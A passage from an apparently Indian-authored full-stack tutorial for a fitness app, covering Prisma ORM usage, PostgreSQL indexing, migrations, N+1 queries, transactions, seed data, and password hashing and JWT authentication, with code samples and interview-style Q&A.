In practice: use findUnique whenever you're looking up by ID or unique field (the common case of loading a specific resource), and findFirst when your filtering criteria aren't unique fields.
What is the difference between include and select in Prisma queries?
Both include and select control what data Prisma returns, but they work differently. include fetches ALL fields of the main model PLUS the specified related models via a JOIN. include: { exercises: true } returns all workout fields AND runs a JOIN to fetch all related exercises. select specifies exactly which fields to return from the main model — it's a projection, like SELECT id, name FROM workouts instead of SELECT *. You can combine select with nested selects on relations: select: { id: true, name: true, exercises: { select: { name: true, sets: true } } }. They are mutually exclusive at the top level — you cannot use both include and select in the same query object (you'd get a TypeScript error). Use select when you want to minimize data transfer (returning 20 workouts but only need their names and IDs for a list view) — this reduces the amount of data PostgreSQL sends and reduces parsing time.
5.9

Database Indexing — Why Queries Are Fast (or Slow)

📖 FORMAL DEFINITION

A database index is an auxiliary data structure (typically a B-tree) that PostgreSQL maintains alongside a table to speed up data retrieval. Without an index, every query on a non-primary-key field requires a sequential scan (Seq Scan) — reading every row in the table. With an index, PostgreSQL performs an Index Scan — following the B-tree to find matching rows in O(log n) time, where n is the number of rows. The trade-off is that indexes consume storage and slow down writes (every INSERT/UPDATE/DELETE must also update all indexes on that table).

💡 BOOK INDEX ANALOGY

Finding "bcrypt" in a 1,000-page programming textbook without an index: read every page (sequential scan). With the index at the back: look up "bcrypt" in alphabetical order in ~3 seconds, find page 347, flip directly there. The index takes 20 pages at the back of the book (storage overhead) but makes lookups instant. Adding 100 new topics requires updating the index (write overhead). Deleting topics also requires index updates. This is exactly how database indexes work.

B-Tree Index — How It Works

▸ B-Tree Index on workouts.userId — Searching for user "u_123"
Root Node
u_500 | u_800
↙ (< u_500) ↘ (> u_800)
u_100 | u_300 | u_450
Internal Node
u_600 | u_700 | u_780
Internal Node
↓ leaf nodes contain actual row pointers
u_100→row42
u_123→row7,row19,row33 ←found!
u_300→row...
u_450→row...
3 comparisons to find all rows for user u_123 — regardless of whether table has 1,000 or 10,000,000 rows

Which Columns to Index in FitoGlobe?

ColumnIndex TypeWhySchema Declaration
workouts.userIdSingleEvery workout query filters by userId — without index, all workouts scanned@@index([userId])
workouts.userId + dateCompositeProgress charts query by user AND date range — covers both conditions@@index([userId, date])
users.emailUniqueLogin queries by email — auto-created by @unique@unique
users.idPrimaryPK — auto-created by @id@id
exercises.workoutIdSingleLoading exercises for a workout — without index, all exercises scanned@@index([workoutId])
diet_entries.userId + dateCompositeDaily calorie dashboard queries — filter by user and date simultaneously@@index([userId, date])
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Indexing
When should you NOT add an index?
Indexes are not free — they have real costs that make them harmful in certain situations. Don't add indexes on small tables: if a table has fewer than ~1,000 rows, PostgreSQL's query planner often chooses a sequential scan anyway because the overhead of using an index outweighs the benefit. Don't over-index write-heavy tables: every INSERT, UPDATE, or DELETE must update all indexes on the table. A table with 10 indexes and 1,000 writes per second spends significant time maintaining indexes. Don't index low-cardinality columns: a column with only 2-3 distinct values (like a boolean isActive or a gender field) gives poor index selectivity — if 60% of rows match your condition, a sequential scan is often faster. Don't index columns that are rarely used in WHERE clauses: unused indexes waste storage and slow writes without helping reads. Use PostgreSQL's EXPLAIN ANALYZE to see which queries perform sequential scans, then add indexes to address actual bottlenecks. For FitoGlobe: the exercises table doesn't need an index on name because exercises are always fetched by workoutId, not by name.
5.10

Migrations vs DB Push — When to Use Each

📖 FORMAL DEFINITION

Prisma Migrate (prisma migrate dev) generates SQL migration files that are tracked in version control. Each schema change produces a timestamped .sql file recording exactly what changed. These files can be reviewed, committed, and replayed deterministically on any environment. DB Push (prisma db push) directly synchronizes the database schema to match schema.prisma without generating migration files — it can destructively drop columns or tables if they no longer exist in the schema.

✓ Use prisma migrate dev (Development)
Creates SQL migration file for the change
Files committed to Git — full history of DB changes
Team members can replay migrations on their local DB
Production-safe — use prisma migrate deploy
Warns before destructive changes (dropping columns)
Use for: any production-bound schema change
⚡ Use prisma db push (Prototyping)
Instant — no migration file created
Fast iteration when schema is still evolving
No migration history — can't replay changes
Can DROP columns/tables without warning
Not safe for production databases with real data
Use for: early dev on a throwaway local DB only
Migration Workflow — Adding a "calories" field to workouts
BASH
1# STEP 1: Edit schema.prisma — add the new field
2# model Workout { ... caloriesBurned Int? ... }
3
4# STEP 2: Generate and apply migration
5npx prisma migrate dev --name add_calories_to_workouts
6# This creates: prisma/migrations/20240115_add_calories_to_workouts/migration.sql
7# Contents of migration.sql:
8# ALTER TABLE "workouts" ADD COLUMN "calories_burned" INTEGER;
9
10# STEP 3: Regenerate Prisma Client (new field now available in code)
11npx prisma generate
12# Now: prisma.workout.create({data:{caloriesBurned: 400}}) ← TypeScript knows this field
13
14# STEP 4: Commit migration file to Git
15git add prisma/migrations/ prisma/schema.prisma
16git commit -m "feat: add calories_burned to workouts table"
17
18# STEP 5: Apply to production (Railway) — runs pending migrations only
19npx prisma migrate deploy // Run this in Railway's build command
20# Prisma tracks which migrations have been applied in _prisma_migrations table
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Migrations
How do you safely add a NOT NULL column to a production table that already has data?
This is a classic database migration challenge. If you simply add a NOT NULL column to a table with existing rows, the database must determine what value those existing rows get for the new column — and since there's no value, it violates the NOT NULL constraint and the migration fails. The safe approach has three steps: (1) Add the column as nullable first — ALTER TABLE workouts ADD COLUMN calories_burned INTEGER. Existing rows get NULL, which is allowed. (2) Backfill existing rows with a sensible default — UPDATE workouts SET calories_burned = 0 WHERE calories_burned IS NULL. For large tables, do this in batches to avoid locking. (3) Add the NOT NULL constraint — ALTER TABLE workouts ALTER COLUMN calories_burned SET NOT NULL. Now all rows have a value, so the constraint is satisfiable. In Prisma, you'd first deploy with caloriesBurned Int?, run a backfill script via a migration, then change to caloriesBurned Int @default(0) in a subsequent migration. Never add NOT NULL columns with no default to production tables in a single migration.
5.11

The N+1 Query Problem

📖 FORMAL DEFINITION

The N+1 query problem occurs when fetching a list of N records triggers N additional queries — one for each record — to fetch related data. Instead of one efficient query loading all data with a JOIN, you get 1 query for the list + N queries for the related records, for a total of N+1 database round-trips. For a page showing 50 workouts with their exercises, N+1 means 51 database queries instead of the optimal 1-2.

💡 SHOPPING LIST ANALOGY

You need to buy 10 items from 10 different stores. The N+1 way: go to Store 1, come home, go to Store 2, come home, repeat 10 times (10 round trips). The efficient way: plan all 10 stores, drive a route that visits all of them once (1 trip with 10 stops). The database round trip is the "drive home" — the most expensive part. Prisma's include is the planned route.

❌ N+1 PROBLEM (50 workouts = 51 queries)
// Query 1: get all workouts const workouts = await prisma.workout.findMany(); // → SELECT * FROM workouts (1 query) for (const workout of workouts) { // Query 2 through 51: one per workout workout.exercises = await prisma.exercise.findMany({ where: { workoutId: workout.id } }); // → SELECT * FROM exercises WHERE workout_id=$1 // → Runs 50 times! = 50 extra queries } // TOTAL: 1 + 50 = 51 database round-trips
✓ SOLUTION — include (2 queries max)
// Prisma's include = JOIN under the hood const workouts = await prisma.workout.findMany({ include: { exercises: true } }); // What Prisma actually runs: // Query 1: SELECT * FROM workouts // Query 2: SELECT * FROM exercises // WHERE workout_id IN (id1, id2, ..., id50) // Then maps exercises to workouts in memory // TOTAL: 2 queries regardless of N // workouts[0].exercises is already populated!
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — N+1
How does Prisma's include prevent the N+1 problem — does it use a SQL JOIN?
Prisma's include uses a two-query strategy, not a traditional SQL JOIN. When you write prisma.workout.findMany({ include: { exercises: true } }), Prisma executes: (1) SELECT * FROM workouts WHERE user_id = $1 — gets all workouts. (2) SELECT * FROM exercises WHERE workout_id IN ($1, $2, ..., $N) — gets all exercises for ALL workouts in a single IN clause. Then Prisma performs the join in JavaScript memory — matching exercises to their parent workouts by ID. This is why it's 2 queries, not 1 SQL JOIN. This approach was chosen because it performs better than a single JOIN for large datasets (avoids row multiplication when one workout has many exercises) and is easier to implement with the Prisma query engine's architecture. The important thing to understand is: the N+1 problem is avoided — you get all your data in a fixed, small number of queries regardless of how many workouts there are. To see what SQL Prisma is actually generating, enable query logging: new PrismaClient({ log: ['query'] }).
5.12

Database Transactions

📖 FORMAL DEFINITION

A database transaction is a sequence of one or more database operations executed as a single atomic unit. Either all operations succeed and are committed, or if any operation fails, all changes are rolled back — as if none of them happened. Transactions are the mechanism behind ACID's "Atomicity" property. They are essential when multiple related database writes must either all succeed or all fail together.

💡 BANK TRANSFER ANALOGY

Transferring ₹10,000 from Account A to Account B requires two operations: debit A, credit B. Without a transaction: if the server crashes between the debit and the credit, ₹10,000 vanishes — A is debited but B never receives it. With a transaction, both operations are grouped atomically — either both happen, or neither happens. FitoGlobe needs this when creating a workout WITH its exercises — if exercise creation fails, the workout should not exist either.

Prisma Transactions — Two Patterns
JS
1// ============================================
2// PATTERN 1: Sequential transactions (simple)
3// All operations run in sequence within one transaction
4// If ANY fails, ALL are rolled back automatically
5// ============================================
6const deleteUserAccount = async (userId) => {
7 // All these run in ONE transaction — if any fails, none happen
8 const [deletedWorkouts, deletedDiet, deletedUser] = await prisma.$transaction([
9 prisma.workout.deleteMany({ where: { userId } }), // Step 1
10 prisma.dietEntry.deleteMany({ where: { userId } }), // Step 2
11 prisma.user.delete({ where: { id: userId } }), // Step 3
12 ]);
13 // If step 3 fails: steps 1 and 2 are rolled back (user keeps their data)
14 return { deletedWorkouts, deletedDiet, deletedUser };
15};
16
17// ============================================
18// PATTERN 2: Interactive transactions (complex logic)
19// Use when later steps depend on results of earlier steps
20// ============================================
21const transferWorkout = async (workoutId, newOwnerId) => {
22 return await prisma.$transaction(async (tx) => {
23 // tx is a transaction-scoped Prisma client
24 // Use tx instead of prisma for ALL queries inside
25 const workout = await tx.workout.findUnique({ where: { id: workoutId } });
26
27 if (!workout) throw new Error('Workout not found'); // Rollback if not found
28
29 const newOwner = await tx.user.findUnique({ where: { id: newOwnerId } });
30 if (!newOwner) throw new Error('New owner not found'); // Rollback
31
32 // Only runs if both checks passed
33 return await tx.workout.update({
34 where: { id: workoutId },
35 data: { userId: newOwnerId }
36 });
37 }); // Transaction commits here if no error was thrown
38};
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Transactions
When must you use a transaction vs when is a single Prisma query sufficient?
A single Prisma query with nested creates (prisma.workout.create({ data: { exercises: { createMany: {...} } } })) already runs inside an implicit transaction — Prisma wraps it automatically. You need an explicit transaction when you have multiple separate Prisma operations that must all succeed or all fail together. Classic FitoGlobe scenarios: (1) Deleting a user account — must delete workouts, diet entries, progress logs, AND the user record. If any deletion fails, none should happen. (2) A "workout template" feature where you clone a workout to a new date — create the new workout AND create copies of all exercises atomically. (3) An "undo last workout" feature that deletes a workout AND restores the user's stats simultaneously. You do NOT need explicit transactions for: reading data (reads don't need atomicity), single writes (already atomic), or writes that are independent (deleting one workout doesn't need to be atomic with deleting another).
5.13

Seed Data — Populating the Database for Development

📖 FORMAL DEFINITION

Database seeding is the process of populating a database with an initial set of data required for the application to function — either for development (test users, sample workouts) or for production (static reference data like exercise templates, muscle group categories). Seed scripts are idempotent — they use upsert patterns to avoid creating duplicates if run multiple times.

backend/prisma/seed.js — Idempotent Seed Script
JS
1const { PrismaClient } = require('@prisma/client');
2const bcrypt = require('bcryptjs');
3const prisma = new PrismaClient();
4
5async function main() {
6 console.log('🌱 Seeding database...');
7
8 // ---- Seed a dev user ----
9 // upsert: if user exists → update, if not → create
10 // Makes the seed script IDEMPOTENT — safe to run multiple times
11 const devUser = await prisma.user.upsert({
12 where: { email: '[email protected]' },
13 update: {}, // Don't change anything if user already exists
14 create: {
15 email: '[email protected]',
16 name: 'Dev User',
17 password: await bcrypt.hash('Password123!', 12), // Hash even for dev!
18 weight: 75,
19 height: 175,
20 goal: 'build_muscle'
21 }
22 });
23
24 // ---- Seed sample workouts ----
25 await prisma.workout.upsert({
26 where: { id: 'seed-workout-1' }, // Stable ID prevents duplicate seeds
27 update: {},
28 create: {
29 id: 'seed-workout-1', // Override auto-generated ID with stable seed ID
30 name: 'Chest Day',
31 duration: 60,
32 userId: devUser.id,
33 exercises: {
34 createMany: { data: [
35 { name: 'Bench Press', sets: 4, reps: 8, weight: 80 },
36 { name: 'Incline DB', sets: 3, reps: 12, weight: 22 },
37 ]}
38 }
39 }
40 });
41
42 console.log('✅ Seeding complete!');
43}
44
45main()
46 .catch((e) => { console.error(e); process.exit(1); })
47 .finally(async () => await prisma.$disconnect());
48// Run with: npm run db:seed (defined in package.json scripts)
⚠️ NEVER SEED PRODUCTION WITH TEST DATA

Seed scripts with dev users and sample data should only run in development. Use NODE_ENV checks in your seed script, or maintain separate seed files — one for dev (fake users, test data) and one for production (reference data like exercise categories, muscle groups). Railway's environment variables make it easy to prevent dev seeds from running in production by checking process.env.NODE_ENV === 'production' and returning early.

🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Seed Data
What is idempotency and why must seed scripts be idempotent?
Idempotency means that performing an operation multiple times produces the same result as performing it once. A seed script that is NOT idempotent creates duplicate records every time it runs — run it 3 times, get 3 dev users, 3 copies of sample workouts, and potentially broken foreign key references. This becomes a real problem in CI/CD pipelines where seed scripts might run on every deployment, or when developers reset their local databases. The upsert pattern (prisma.user.upsert({ where: { email: '[email protected]' }, update: {}, create: {...} })) makes seeds idempotent — if the record already exists, it's left unchanged; if it doesn't exist, it's created. Using a stable, hardcoded ID for seed records (id: 'seed-workout-1') rather than letting Prisma auto-generate a CUID ensures that re-running the seed doesn't create a second workout with a different ID.
✓ PART 5 COMPLETE
Database Complete

You now understand the full database layer — from ACID guarantees to N+1 queries, from schema design to migrations to transactions. This is the foundation everything else depends on.

ACID ✓ SQL vs NoSQL ✓ PostgreSQL ✓ Prisma ORM ✓ Full Schema ✓ Relations ✓ All CRUD Ops ✓ Indexing ✓ N+1 Problem ✓ Transactions ✓ Migrations ✓ Seed Data ✓
MERGE INSTRUCTION: Copy the <div class="content-area"> contents from this file and paste after Part 4's last </section> in the master file.
PART 06 / 13

Authentication Deep Dive

Authentication is where security breaches happen when developers don't understand the internals. Why is bcrypt slow on purpose? How does JWT signature verification actually work? Why is localStorage dangerous? Every answer — starting from first principles.

Auth vs Authorization bcrypt Internals JWT Structure Token Storage XSS vs CSRF Refresh Tokens Google OAuth Password Reset
6.1

Authentication vs Authorization

📖 FORMAL DEFINITION

Authentication (AuthN) is the process of verifying the identity of a user — answering the question "Who are you?" It confirms that the person claiming to be Ayush is actually Ayush, typically via a password, biometric, or OAuth token. Authorization (AuthZ) is the process of determining what an authenticated user is permitted to do — answering the question "What are you allowed to do?" It controls access to resources and actions based on the verified identity.

💡 CONCERT ANALOGY

Authentication is the bouncer checking your ID at the gate — confirming you are who you claim to be. Authorization is the staff checking whether your ticket is general admission or VIP backstage access. Both happen after you arrive, in exactly that order. You must first be authenticated (identified) before authorization (permission check) is meaningful. In FitoGlobe: authentication = verifying the JWT token is valid and belongs to a real user. Authorization = checking that the user requesting a workout deletion is the workout's owner.

▸ AuthN vs AuthZ in FitoGlobe's Request Pipeline
REQUEST
DELETE /api/workouts/workout-123  |  Authorization: Bearer eyJ...
AUTHN ✓
protect() → jwt.verify(token) → token is valid → req.user = {id:"user-456", email:"[email protected]"} → ✓ You are authenticated
AUTHZ CHECK
deleteWorkout() → prisma.workout.findUnique(workout-123) → workout.userId === req.user.id?
PASS ✓
workout.userId = "user-456" = req.user.id ✓ → Authorized → DELETE proceeds → 204 No Content
FAIL ✗
workout.userId = "user-789" ≠ req.user.id ✗ → Not Authorized → 403 Forbidden (NOT 401)
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Authentication vs Authorization
What is the difference between authentication and authorization? Give a concrete example from FitoGlobe.
Authentication establishes identity — it answers "Who are you?" In FitoGlobe, when a user submits their email and password to POST /api/auth/login, the server hashes the submitted password with bcrypt and compares it to the stored hash. If they match, the server knows this person is the legitimate owner of that account. A JWT is then issued as a token of proven identity. Authorization establishes permission — it answers "Are you allowed to do this?" In FitoGlobe, authentication happens in the protect middleware (verifying the JWT). Authorization happens in the controller — after we know who the user is, we check whether they are the owner of the workout they want to delete. A user with a perfectly valid JWT (authenticated) will still receive a 403 Forbidden if they try to delete someone else's workout (not authorized). The critical mistake beginners make is confusing 401 (Unauthorized — actually means "not authenticated") with 403 (Forbidden — means "authenticated but not authorized").
6.2

Password Security — Why Plain Text Is Catastrophic

🚨 NEVER STORE PLAIN TEXT PASSWORDS

If FitoGlobe's database is breached and passwords are stored in plain text, every user's password — and their password on every other site they reuse it — is immediately compromised. This is not hypothetical: major companies have been fined millions and lost users over this exact mistake. The solution is one-way cryptographic hashing.

📖 HASHING vs ENCRYPTION — Critical Distinction

Encryption is a two-way operation — data can be decrypted back to its original form with a key. You should NEVER encrypt passwords because the decryption key could be compromised, revealing all passwords. Hashing is a one-way mathematical function — it converts input to a fixed-length digest that cannot be reversed. You verify a password by hashing the submitted value and comparing the result to the stored hash. The original password is never recoverable from the hash.

▸ Password Storage: Wrong vs Right vs Best
✗ PLAIN TEXT (catastrophic)
DB: password = "MyPass123"

Breach → attacker reads
password directly

100% of users compromised
⚠ MD5/SHA256 (insufficient)
DB: sha256("MyPass123")
= "a665a459..."

Breach → attacker uses
rainbow table lookup

Cracked in seconds
✓ bcrypt (FitoGlobe)
DB: $2b$12$salt.hash
(includes random salt)

Breach → each hash
takes ~250ms to test

Infeasible to crack at scale

Why Fast Hash Functions (MD5, SHA-256) Are Dangerous for Passwords

MD5 and SHA-256 are designed to be fast — they can hash billions of strings per second on modern GPUs. This is great for checksums and digital signatures, but terrible for passwords. An attacker who steals your database can run a dictionary attack or rainbow table attack: pre-compute the hashes of millions of common passwords and compare them to your stolen hashes. SHA-256("password123") always equals the same value — if two users have the same password, they have identical hashes, making bulk cracking trivial.

🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — Password Security
What is a rainbow table attack and how does salting prevent it?
A rainbow table is a precomputed database mapping common passwords to their hash values. An attacker who steals a database of SHA-256 hashed passwords can run a simple lookup: find the hash in the rainbow table, immediately know the original password. Rainbow tables for MD5 and SHA-256 covering billions of common passwords exist and are freely downloadable. Salting defeats rainbow tables completely. A salt is a random, unique string generated for each user and stored alongside their hash. The password is hashed as hash(password + salt). Since every user has a different salt, even if two users have identical passwords, their hashes are different — a rainbow table built without that specific salt is useless. The attacker would need to build a separate rainbow table for each unique salt, which is computationally infeasible. bcrypt automatically generates a cryptographically random 128-bit salt for every password hash and embeds it in the output string — you never need to manage salts manually.
6.3

bcrypt — Why Intentionally Slow Is the Right Design

📖 FORMAL DEFINITION

bcrypt is a password hashing algorithm designed by Niels Provos and David Mazières (1999) specifically for password storage. It incorporates a salt (random per-hash data that prevents rainbow table attacks) and a configurable cost factor (rounds parameter) that controls computational expense. Unlike general-purpose hash functions, bcrypt is intentionally slow — its work factor can be increased as hardware improves, keeping brute-force attacks infeasible over time.

💡 DELIBERATE SPEED BUMP ANALOGY

Imagine a vault door that takes 250 milliseconds to open. For you logging in once, 250ms is imperceptible. But an attacker trying 1 billion password guesses would take 31 years at 250ms each. SHA-256 opens the same vault in 0.000001ms — allowing 1 billion guesses per second, crackable in about 1 second. bcrypt's slowness is not a bug. It is its most important security feature. And unlike SHA-256's fixed speed, bcrypt's cost factor lets you make it slower as computers get faster.

The bcrypt Hash Structure

▸ Anatomy of a bcrypt Hash — Decoding $2b$12$salt+hash
$2b$12$IxjSpQ0mGxO/yQR5GD4mNut06VH/CWnGagFJBf4kEtEcblC
$2b$
Algorithm version. 2b = current bcrypt version (more secure than 2a, 2y)
12$
Cost factor. 2¹² = 4,096 iterations. Every +1 doubles the time. Range: 4-31.
22 chars
128-bit random salt encoded in base64. Unique per password. Never the same twice.
31 chars
The actual hash — 184-bit result. The password's "fingerprint" combined with salt.

Cost Factor (Rounds) — Choosing the Right Value

8
~2ms
Too fast (2014 era)
10
~65ms
Acceptable (older)
12
~250ms
Recommended ✓
13
~500ms
High security
14
~1s
Very high security
16+
>4s
Too slow for web
⚠️ WHY ROUNDS=12 IS THE SWEET SPOT

At rounds=12, hashing takes ~250ms. For a legitimate user logging in, 250ms is invisible. For an attacker trying to brute-force a stolen database, 250ms per attempt means they can test only 4 passwords per second per CPU core. A password with 8 mixed characters has ~6 quadrillion combinations — at 4/second, that's 47 billion years. Increase rounds every few years as hardware improves. Rule of thumb: the longest time your login UX can tolerate, but no less than 10.

💻 CODE EXAMPLE
backend/controllers/auth.controller.js — bcrypt Register + Login
JS
1const bcrypt = require('bcryptjs'); // Use bcryptjs (pure JS) not bcrypt (requires native binding)
2const jwt = require('jsonwebtoken');
3const prisma = require('../config/db');
4
5// ---- REGISTER ----
6const register = async (req, res, next) => {
7 try {
8 const { email, password, name } = req.body;
9
10 // Check duplicate email BEFORE hashing (expensive operation)
11 const existing = await prisma.user.findUnique({ where: { email } });
12 if (existing) return res.status(409).json({ error: 'Email already registered' });
13
14 // NEVER store plain password. Hash it BEFORE saving to database.
15 // 12 = cost factor (2^12 = 4096 iterations). Adjust as hardware improves.
16 // bcrypt.hash() is async — runs on libuv thread pool, won't block event loop
17 const hashedPassword = await bcrypt.hash(password, 12);
18 // Result: "$2b$12$IxjSpQ0mGxO/yQR5GD4mNut06VH/CWnGagFJBf4kEtEcblC..."
19 // This string IS the password entry — no separate salt field needed
20
21 const user = await prisma.user.create({
22 data: { email, name, password: hashedPassword },
23 select: { id: true, email: true, name: true } // NEVER return password hash in response
24 });
25
26 const token = generateToken(user.id);
27 res.status(201).json({ user, token });
28 } catch (err) { next(err); }
29};
30
31// ---- LOGIN ----
32const login = async (req, res, next) => {
33 try {
34 const { email, password } = req.body;
35
36 // Fetch user including password hash (normally excluded via select)
37 const user = await prisma.user.findUnique({
38 where: { email }
39 });
40
41 // ✅ SECURITY: Generic error message — don't reveal whether email exists
42 // "Email not found" lets attackers enumerate valid accounts
43 if (!user || !user.password) {
44 return res.status(401).json({ error: 'Invalid email or password' });
45 }
46
47 // bcrypt.compare() hashes submitted password with stored salt and compares
48 // Returns true if they match, false otherwise — NEVER do manual comparison
49 // bcrypt.compare() is timing-safe — prevents timing side-channel attacks
50 const isMatch = await bcrypt.compare(password, user.password);
51
52 if (!isMatch) {
53 return res.status(401).json({ error: 'Invalid email or password' }); // Same message!
54 }
55
56 // Credentials valid — issue JWT (remove password from user object first)
57 const { password: _, ...safeUser } = user; // Destructure out password
58 const token = generateToken(user.id);
59 res.json({ user: safeUser, token });
60 } catch (err) { next(err); }
61};
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — bcrypt
Why use bcrypt instead of SHA-256 for passwords? Aren't they both hashing algorithms?
Both are hashing algorithms, but they serve fundamentally different purposes and have opposite performance goals. SHA-256 is a general-purpose cryptographic hash function optimized for maximum speed — it can compute billions of hashes per second on modern GPUs. This is desirable for checksums, digital signatures, and blockchain, but catastrophic for passwords because it enables rapid brute-force attacks. bcrypt is specifically designed for password hashing with three properties that SHA-256 lacks: (1) Automatic salting — each bcrypt call generates a unique random salt, embedded in the output, preventing rainbow table attacks. (2) Configurable cost — the work factor can be increased to keep pace with hardware improvements, maintaining a target time of ~250ms per hash regardless of how powerful computers become. (3) Intentional slowness — bcrypt was designed in 1999 to take 100ms on 1999 hardware; the cost factor allows it to take 100ms on 2024 hardware too. Argon2 (the PHC winner) is even better for new applications, but bcrypt remains the widely-supported, battle-tested standard.
What is a timing attack and how does bcrypt.compare() prevent it?
A timing attack exploits the fact that string comparison typically short-circuits — it stops as soon as it finds a mismatch. By measuring the response time of failed authentication attempts, an attacker can infer how many characters of their guess were correct. If the comparison hash === storedHash returns faster when the first character is wrong versus when the first character is right, this timing difference leaks information. A sophisticated attacker can binary-search the correct hash character by character. bcrypt.compare() is implemented as a constant-time comparison — it always takes the same amount of time regardless of where the mismatch occurs, because it checks the bcrypt hash internally using the same work factor. This prevents timing side-channel attacks. For the same reason, you should never compare password hashes with === or if (storedHash === submittedHash) — always use bcrypt's own comparison function.
6.4

JWT — Complete Guide (Header.Payload.Signature)

📖 FORMAL DEFINITION

A JWT (JSON Web Token) is an open standard (RFC 7519) for securely transmitting information as a compact, URL-safe string consisting of three Base64URL-encoded parts separated by dots: header.payload.signature. The header specifies the token type and signing algorithm. The payload contains claims (key-value assertions about the user). The signature cryptographically binds the header and payload to a secret — any modification to either part invalidates the signature, making the token tamper-proof.

💡 SIGNED LETTER ANALOGY

A JWT is like a signed letter. The header is the envelope format. The payload is the letter's contents ("This person is Ayush, their user ID is xyz, this expires in 7 days"). The signature is a wax seal — it proves the letter was written by someone with the private key (JWT_SECRET). Anyone can read the letter (Base64 is reversible) but no one can forge the seal without the secret. If someone changes the letter ("change userId to 999"), the seal doesn't match and the forgery is detected. The letter is genuine, but not confidential — don't write secrets in it.

Anatomy of a JWT

▸ JWT Structure — Decoded FitoGlobe Token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImNseDhrMmFiYzEyMyIsImVtYWlsIjoiYXl1c2hAZml0b2dsb2JlLmNvbSIsImlhdCI6MTcwNTMxMDQwMCwiZXhwIjoxNzA1OTE1MjAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
① HEADER (red)
Base64URL decode →
"alg": "HS256",
"typ": "JWT"

alg = HMAC-SHA256
signing algorithm
② PAYLOAD (purple)
Base64URL decode →
"id": "clx8k2abc123",
"email": "ayush@...",
"iat": 1705310400,
"exp": 1705915200

iat=issued at
exp=expires at (7d later)
③ SIGNATURE (green)
Not reversible →
HMAC_SHA256(
  base64(header) +
  "." +
  base64(payload),
  JWT_SECRET
)
Requires secret to forge
🚨 THE PAYLOAD IS PUBLIC — NOT ENCRYPTED

The header and payload are only Base64URL-encoded, NOT encrypted. Anyone can decode them — paste any JWT into jwt.io to see the contents instantly. This means: (1) Never put sensitive information in the payload — no passwords, no credit card numbers, no private data. (2) The only thing that protects the JWT is the signature. Without the JWT_SECRET, the signature cannot be forged, so the payload cannot be modified. But it CAN be read by anyone who intercepts the token.

💻 CODE EXAMPLE
backend/utils/generateToken.js — JWT Sign & Verify
JS
1const jwt = require('jsonwebtoken');
2
3// ---- GENERATE (called after login/register) ----
4const generateToken = (userId) => {
5 // jwt.sign(payload, secret, options)
6 // payload: data to encode — keep minimal (only what middleware needs)
7 // NEVER include sensitive data: password, SSN, credit cards
8 return jwt.sign(
9 { id: userId }, // Payload — only the user ID
10 process.env.JWT_SECRET, // Secret — must be strong random string
11 { expiresIn: process.env.JWT_EXPIRE || '7d' } // Token lifespan
12 );
13 // Returns: "eyJhbGci...header.payload.signature"
14};
15
16// ---- HOW SIGNING WORKS INTERNALLY ----
17// header = base64url({"alg":"HS256","typ":"JWT"})
18// payload = base64url({"id":"clx8k2...","iat":1705...,"exp":1705...})
19// signingInput = header + "." + payload
20// signature = base64url(HMAC_SHA256(signingInput, JWT_SECRET))
21// token = signingInput + "." + signature
22
23// ---- VERIFY (called in protect middleware) ----
24// jwt.verify() does TWO things simultaneously:
25// 1. Recomputes signature from header+payload+secret
26// 2. Compares recomputed signature with token's signature
27// 3. Checks exp claim hasn't passed
28// If all pass → returns decoded payload as JS object
29// If any fail → throws JsonWebTokenError or TokenExpiredError
30const decoded = jwt.verify(token, process.env.JWT_SECRET);
31// decoded = { id: "clx8k2...", iat: 1705310400, exp: 1705915200 }
32
33module.exports = { generateToken };
🎤 INTERVIEW Q&A
🎤 INTERVIEW QUESTIONS — JWT
How does the server verify a JWT without storing it in a database?
This is the key innovation of JWT — stateless verification. When the server issued the JWT, it signed it using HMAC_SHA256(header.payload, JWT_SECRET). The JWT_SECRET never leaves the server. When a client sends the token back, the server: (1) Splits the token into header, payload, and signature. (2) Re-computes what the signature should be: HMAC_SHA256(header.payload, JWT_SECRET). (3) Compares the re-computed signature with the token's signature using a constant-time comparison. (4) If they match, the token is genuine — it was issued by this server with this secret. If someone modified the payload (e.g., changed userId to another user's ID), step 2 would produce a different signature that doesn't match, and the token is rejected. This means the server doesn't need to store or look up tokens — verification is pure computation. This is why JWT enables horizontal scaling: any server instance with the same JWT_SECRET can verify tokens without shared state.
What is the difference between HS256 and RS256 in JWT?
HS256 (HMAC-SHA256) uses a single shared secret for both signing and verification — the same key does both. Every service that needs to verify JWTs must have the secret. This is simple and fast, but means the JWT_SECRET must be shared with all verification services. If any service is compromised, the attacker can forge tokens. FitoGlobe uses HS256. RS256 (RSA-SHA256) uses an asymmetric key pair: a private key signs the token, a public key verifies it. The private key stays on the authentication server. Any other service gets only the public key to verify tokens. Even if a verification service is compromised, the attacker gets only the public key — they cannot sign new tokens. RS256 is preferred in microservices architectures where many services need to verify tokens but shouldn't all have signing capability. For FitoGlobe's monolithic Express backend, HS256 with a strong 64-character random secret is secure and appropriate.
6.5

Complete JWT Flow in FitoGlobe

▸ Full JWT Lifecycle — Login to Protected Request
React
POST /api/auth/login { email: "[email protected]", password: "pass123" }
Express
bcrypt.compare("pass123", storedHash) → true → jwt.sign({id: "user-456"}, SECRET) → token
React
Receives {user, token} → localStorage.setItem("fitoglobe_token", token) → navigate("/")
— Later, user clicks "View Workouts" —
Axios
Request interceptor → reads localStorage → adds Authorization: Bearer eyJhbGci...
protect()
jwt.verify(token, SECRET) → {id:"user-456"} → prisma.user.findUnique → req.user = {...}
Controller
prisma.workout.findMany({where:{userId: req.user.id}}) → 200 OK + workouts array
— 7 days later, token expires —
protect()
jwt.verify() throws TokenExpiredError → next(new ApiError(401, "Session expired"))
Axios
Response interceptor catches 401 → localStorage.removeItem(token) → window.location = "/login"
6.6

Token Storage — localStorage vs httpOnly Cookie (XSS vs CSRF)

ℹ️ THE MOST DEBATED SECURITY QUESTION IN WEB DEV

